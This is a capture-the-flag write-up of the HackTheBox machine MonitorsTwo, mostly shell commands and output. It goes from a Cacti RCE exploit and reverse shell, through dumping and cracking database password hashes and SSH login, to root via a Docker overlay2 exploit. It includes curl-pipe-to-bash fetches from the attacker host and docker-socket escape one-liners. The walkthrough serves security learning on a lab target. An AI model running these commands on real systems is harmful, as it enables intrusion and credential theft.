---
render_with_liquid: false
title: HackTheBox Writeup  MonitorsTwo
date: 2023-07-14 13:04:33 +1400
tags: [hackthebox, nmap, linux, php, feroxbuster, cacti, searchsploit, cve-2022-46169, docker, mysql, hashcat, weak-credentials, password-reuse, cve-2021-41091, docker-abuse, suid]
---




# Recon
---

## Nmap

```bash

# Nmap 7.94 scan initiated Fri Jul 14 13:04:33 2023 as: nmap -sVC -p- -T4 -Pn -vv -oA monitorstwo 10.10.11.211
Nmap scan report for 10.10.11.211
Host is up, received user-set (0.061s latency).
Scanned at 2023-07-14 13:04:33 CST for 45s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 4F12CCCD3C42A4A478F067337FE92794
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Fri Jul 14 13:05:18 2023 -- 1 IP address (1 host up) scanned in 45.05 seconds
```


## 80 - WebSite


### Info

![](/assets/obsidian/e2a394311d7c02ec4cf8a06ce6d85c05.png)

- `Cacti 1.2.22`


### Directory

```bash
┌──(kali㉿kali)-[~/htb/monitorstwo]
└─$ feroxbuster -u http://10.10.11.211 --dont-extract-links -S 186
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      314c http://10.10.11.211/images => http://10.10.11.211/images/
301      GET        9l       28w      315c http://10.10.11.211/scripts => http://10.10.11.211/scripts/
301      GET        9l       28w      315c http://10.10.11.211/plugins => http://10.10.11.211/plugins/
301      GET        9l       28w      315c http://10.10.11.211/include => http://10.10.11.211/include/
301      GET        9l       28w      315c http://10.10.11.211/install => http://10.10.11.211/install/
301      GET        9l       28w      313c http://10.10.11.211/cache => http://10.10.11.211/cache/
301      GET        9l       28w      311c http://10.10.11.211/lib => http://10.10.11.211/lib/
301      GET        9l       28w      312c http://10.10.11.211/docs => http://10.10.11.211/docs/
200      GET      272l      862w    13844c http://10.10.11.211/
301      GET        9l       28w      318c http://10.10.11.211/include/js => http://10.10.11.211/include/js/
301      GET        9l       28w      322c http://10.10.11.211/include/themes => http://10.10.11.211/include/themes/
301      GET        9l       28w      325c http://10.10.11.211/install/templates => http://10.10.11.211/install/templates/
301      GET        9l       28w      323c http://10.10.11.211/include/content => http://10.10.11.211/include/content/
301      GET        9l       28w      315c http://10.10.11.211/service => http://10.10.11.211/service/
301      GET        9l       28w      319c http://10.10.11.211/docs/images => http://10.10.11.211/docs/images/
301      GET        9l       28w      321c http://10.10.11.211/include/fonts => http://10.10.11.211/include/fonts/
301      GET        9l       28w      316c http://10.10.11.211/resource => http://10.10.11.211/resource/
301      GET        9l       28w      318c http://10.10.11.211/include/fa => http://10.10.11.211/include/fa/
301      GET        9l       28w      321c http://10.10.11.211/include/fa/js => http://10.10.11.211/include/fa/js/
301      GET        9l       28w      322c http://10.10.11.211/include/fa/css => http://10.10.11.211/include/fa/css/
301      GET        9l       28w      322c http://10.10.11.211/include/vendor => http://10.10.11.211/include/vendor/
200      GET        7l       28w      165c http://10.10.11.211/include/content/README
301      GET        9l       28w      332c http://10.10.11.211/include/vendor/phpmailer => http://10.10.11.211/include/vendor/phpmailer/
301      GET        9l       28w      330c http://10.10.11.211/include/themes/classic => http://10.10.11.211/include/themes/classic/
301      GET        9l       28w      341c http://10.10.11.211/include/vendor/phpmailer/language => http://10.10.11.211/include/vendor/phpmailer/language/
301      GET        9l       28w      337c http://10.10.11.211/include/themes/classic/images => http://10.10.11.211/include/themes/classic/images/
301      GET        9l       28w      315c http://10.10.11.211/locales => http://10.10.11.211/locales/
301      GET        9l       28w      336c http://10.10.11.211/include/vendor/phpmailer/src => http://10.10.11.211/include/vendor/phpmailer/src/
200      GET        1l        1w        5c http://10.10.11.211/include/vendor/phpmailer/VERSION
200      GET      502l     4372w    26529c http://10.10.11.211/include/vendor/phpmailer/LICENSE
301      GET        9l       28w      327c http://10.10.11.211/include/fa/metadata => http://10.10.11.211/include/fa/metadata/
301      GET        9l       28w      330c http://10.10.11.211/include/themes/sunrise => http://10.10.11.211/include/themes/sunrise/
301      GET        9l       28w      337c http://10.10.11.211/include/themes/sunrise/images => http://10.10.11.211/include/themes/sunrise/images/
301      GET        9l       28w      338c http://10.10.11.211/include/themes/sunrise/default => http://10.10.11.211/include/themes/sunrise/default/
```


# User Flag
---

Tried login with `admin`:`admin`, `admin`:`password`, `admin`:``


## cacti - RCE (CVE-2022-46169)

```bash
searchsploit cacti 1.2.22
```

![](/assets/obsidian/1eac2ec555000d79dca733285b755a38.png)

```bash
┌──(kali㉿kali)-[~/htb/monitorstwo]
└─$ searchsploit -m 51166
  Exploit: Cacti v1.2.22 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51166
     Path: /usr/share/exploitdb/exploits/php/webapps/51166.py
    Codes: CVE-2022-46169
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/htb/monitorstwo/51166.py
```

Fix the cacti local ip to localhost in the exploit code

```bash
vi 51166.py
```

```bash
┌──(kali㉿kali)-[~/htb/monitorstwo]
└─$ diff 51166.py /usr/share/exploitdb/exploits/php/webapps/51166.py
```

```diff
23c23
<         local_cacti_ip  = "127.0.0.1"
---
>         local_cacti_ip  = self.url.split("//")[1].split("/")[0]
69c69
<     main()
---
>     main()
\ No newline at end of file
```

Run the exploit

```bash
┌──(kali㉿kali)-[~/htb/monitorstwo]
└─$ python 51166.py -u http://10.10.11.211 -i 10.10.14.28 -p 1111
200 - [{"value":"22","rrd_name":"proc","local_data_id":"1"}]
200 - [{"value":"1min:0.00 5min:0.00 10min:0.00","rrd_name":"","local_data_id":"2"}]
200 - [{"value":"0","rrd_name":"users","local_data_id":"3"}]
200 - [{"value":"2146012","rrd_name":"mem_buffers","local_data_id":"4"}]
200 - [{"value":"1048572","rrd_name":"mem_swap","local_data_id":"5"}]
```

Got reverse shell 

```bash
┌──(kali㉿kali)-[~/htb/monitorstwo]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.11.211] 44650
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$
```

Upgrade the shell

```bash
www-data@50bca5e748b0:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@50bca5e748b0:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(kali㉿kali)-[~/htb/monitorstwo]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111

www-data@50bca5e748b0:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@50bca5e748b0:/var/www/html$
```


## Docker Container Awareness

> **deepce** is a very good tool to enumerate container : [[#Additional#Docker Automatic Enumeration & Escape Tools#Deepce]]

Assuming it's a container based on 

- the random hostname : `50bca5e748b0`
- Common utils like `python`, `ip`, `netstat` are not installed
- `/home` directory is empty

to confirm, head to `/` root directory 

```bash
ls -la /
```

![](/assets/obsidian/eaea7aeb7a869bc71ba8380dbc477ab0.png)

> `entrypoint.sh`

```bash

#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html

# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"
```

Got the mysql database credentials - `root`:`root`


## Mysql Database Credentials

```bash
<w/html$ mysql --host=db --user=root --password=root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 221
Server version: 5.7.40 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

```bash
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| cacti              |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.001 sec)
```

```bash
MySQL [(none)]> use cacti;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [cacti]> show tables;
+-------------------------------------+
| Tables_in_cacti                     |
+-------------------------------------+
| aggregate_graph_templates           |
...
| user_auth                           |
| user_auth_cache                     |
| user_auth_group                     |
| user_auth_group_members             |
| user_auth_group_perms               |
| user_auth_group_realm               |
| user_auth_perms                     |
| user_auth_realm                     |
| user_domains                        |
| user_domains_ldap                   |
| user_log                            |
| vdef                                |
| vdef_items                          |
| version                             |
+-------------------------------------+
111 rows in set (0.001 sec)
```

Output username and password in the format for hashcat to crack

```bash
MySQL [cacti]> select concat(username,':',password) from user_auth;
+---------------------------------------------------------------------+
| concat(username,':',password)                                       |
+---------------------------------------------------------------------+
| admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC  |
| guest:43e9a4ab75570f5b                                              |
| marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |
+---------------------------------------------------------------------+
3 rows in set (0.001 sec)
```

> Hold `SHIFT + ALT` and select the text in Windows Terminal to get rectangle selection

![](/assets/obsidian/98cb26b63342ba9cabe3c714ea385dd5.png)

```bash
vi cacti_user.hash
```


## Crack User Hash encrypted with bcrypt

Crack the hash outside virtual machine to gain better performance

```bash
.\hashcat D:\kali-share\cacti_user.hash D:\kali-share\rockyou.txt --user
```

![](/assets/obsidian/acb6be71f581ad3b006f2c02d79f3330.png)

Looks like `bcrypt`

```bash
PS J:\.1\PASSWARE\hashcat-6.2.6> .\hashcat D:\kali-share\cacti_user.hash D:\kali-share\rockyou.txt --user -m 3200
```

![](/assets/obsidian/9eaeaac895dbabdf7a2cc8dcd5fdaddd.png)

Only the hash for `marcus` is cracked

```bash
PS J:\.1\PASSWARE\hashcat-6.2.6> .\hashcat D:\kali-share\cacti_user.hash D:\kali-share\rockyou.txt --user -m 3200 --show
marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
```

Login to cacti is disabled

![](/assets/obsidian/a8f6bbefc911f2048ac57e98acbdbca5.png)


## Login With SSH

```bash
┌──(kali㉿kali)-[~/htb/monitorstwo]
└─$ sshpass -p 'funkymonkey' ssh -o "StrictHostKeyChecking no" marcus@10.10.11.211
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)
...
The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
Last login: Fri Jul 14 17:44:21 2023 from 10.10.14.44
marcus@monitorstwo:~$ id
uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)
marcus@monitorstwo:~$ cat ~/user.txt
94c61dfecfa16089f291d19076be0284
```


# Root Flag
---

## Vulnerabilities Awareness Mail

This message after ssh login: `You have mail` reminds me of another hack the box machine recently: [[HackTheBox Writeup - TwoMillion#Root Flag#CVE-2023-0386]]

```bash
marcus@monitorstwo:~$ cat /var/mail/marcus
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```


## Docker - Directory Traversal Exploit (CVE-2021-41091)

The mail mentioned : `CVE-2021-41091`

> Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions

Confirm that the docker version is exploitable

```bash
marcus@monitorstwo:~$ docker -v
Docker version 20.10.5+dfsg1, build 55c4c88
```

Search : `CVE-2021-41091 exploit`

> https://github.com/UncleJ4ck/CVE-2021-41091

```bash
git clone https://github.com/UncleJ4ck/CVE-2021-41091
cd CVE-2021-41091
python3 -m http.server 80
```

On target:

```bash
marcus@monitorstwo:~$ curl -s 10.10.14.28/exp.sh|bash
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

[x] Please set the setuid bit on /bin/bash in the Docker container and try again.
```


## Get root in the docker container

Go to docker container and get root via abusing SUID

```bash
www-data@50bca5e748b0:/tmp$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/tmp/bash
/sbin/capsh
/bin/mount
/bin/umount
/bin/su
```

> GTFOBIN : https://gtfobins.github.io/gtfobins/capsh/

```bash
www-data@50bca5e748b0:/tmp$ capsh --gid=0 --uid=0 --
root@50bca5e748b0:/tmp# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@50bca5e748b0:/tmp#
```


## Set setuid bit on `bash` in the docker container

```bash
root@50bca5e748b0:/root# chmod u+s /bin/bash
```


## Exploit CVE-2021-41091 from host

Using **curl** + pipe will fail the exploit, download the `exp.sh` bash script on target then execute directly

```bash
cd /dev/shm&&wget 10.10.14.28/exp.sh
chmod +x ./exp.sh
```

The exploit will prompt for (yes/no)

```bash
marcus@monitorstwo:/dev/shm$ ./exp.sh
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
```

```bash
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
	[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell
bash-5.1# exit
```

It didn't spawn a shell, get shell by following the instructions

```bash
marcus@monitorstwo:/dev/shm$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
bash-5.1# id
uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
bash-5.1# cat /root/root.txt
9a57bab0575b0679b53be5c1781c6e36
bash-5.1#
```


# Additional
---

## Docker Automatic Enumeration & Escape Tools


### Linpeas

> Good for gathering basic information

```bash
curl 10.10.14.28/linpeas.sh|bash
```

![](/assets/obsidian/89c5abe47d078bd0e63cca8d6d73826a.png)

![](/assets/obsidian/dab698a4e0b0204d9759d753444ca085.png)


### Deepce

> https://github.com/stealthcopter/deepce

Nice enumeration result

```bash
curl 10.10.14.28/deepce.sh|bash
```

![](/assets/obsidian/89a94361f40a65bd8fb6070de7a9d5b2.png)

![](/assets/obsidian/29e79d39b9de2aaaa6d81e74acdb076e.png)

![](/assets/obsidian/8e66a1d2974c67039efb0e5aa459e502.png)


### CDK - Zero Dependency Container Penetration Toolkit

> https://github.com/cdk-team/CDK

> Good for testing exploits based on **deepce** result

```bash
wget 10.10.14.28/cdk
chmod +x cdk
```

**Evaluate**

```bash
./cdk eva
```

![](/assets/obsidian/bc406e5616bd94cd3141dab93cb7f1f0.png)

**Exploits**

After evaluate, test exploits

```bash
./cdk run --list
```

![](/assets/obsidian/c14c3f708d7febb7a52caf2ae5a558be.png)

```bash
www-data@50bca5e748b0:/tmp$ ./cdk run check-ptrace
2023/07/15 06:43:42 SYS_PTRACE capability was disabled.
```

Go on next

> auto-escape is getting deprecated


## Docker Breakout / Privilege Escalation

Hacktricks have a very good cover for this 

> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation


### Capabilities Abuse Escape

> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#privesc-container-escape

Dangerous capabilities: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`****, **`CAP_SYSLOG`****, **`CAP_NET_RAW`****, **`CAP_NET_ADMIN`**

Cehck:

```bash
capsh --print
```


### Escape from Privileged Containers

Much more easier to escape from privileged containers

> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#escape-from-privileged-containers


### Mounted Docker Socket Escape

> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#mounted-docker-socket-escape

```bash

#Search the socket
find / -name docker.sock 2>/dev/null

#It's usually in /run/docker.sock
```

If the file is found, then

```bash

#List images to use one
docker images

#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash


# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash


# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```


## Failed Attemptes


### Kernel Exploit

Try the kernel exploit first

```bash
marcus@monitorstwo:~$ uname -a
Linux monitorstwo 5.4.0-147-generic #164-Ubuntu SMP Tue Mar 21 14:23:17 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

Search : `CVE-2021-33033 exploit db`

> https://www.exploit-db.com/exploits/50808

```bash
searchsploit dirty pipe
```

```bash
┌──(kali㉿kali)-[~/htb/monitorstwo]
└─$ searchsploit -m 50808
  Exploit: Linux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)
      URL: https://www.exploit-db.com/exploits/50808
     Path: /usr/share/exploitdb/exploits/linux/local/50808.c
    Codes: CVE-2022-0847
 Verified: False
File Type: C source, ASCII text
Copied to: /home/kali/htb/monitorstwo/50808.c
```

> Failed, target have no gcc installed

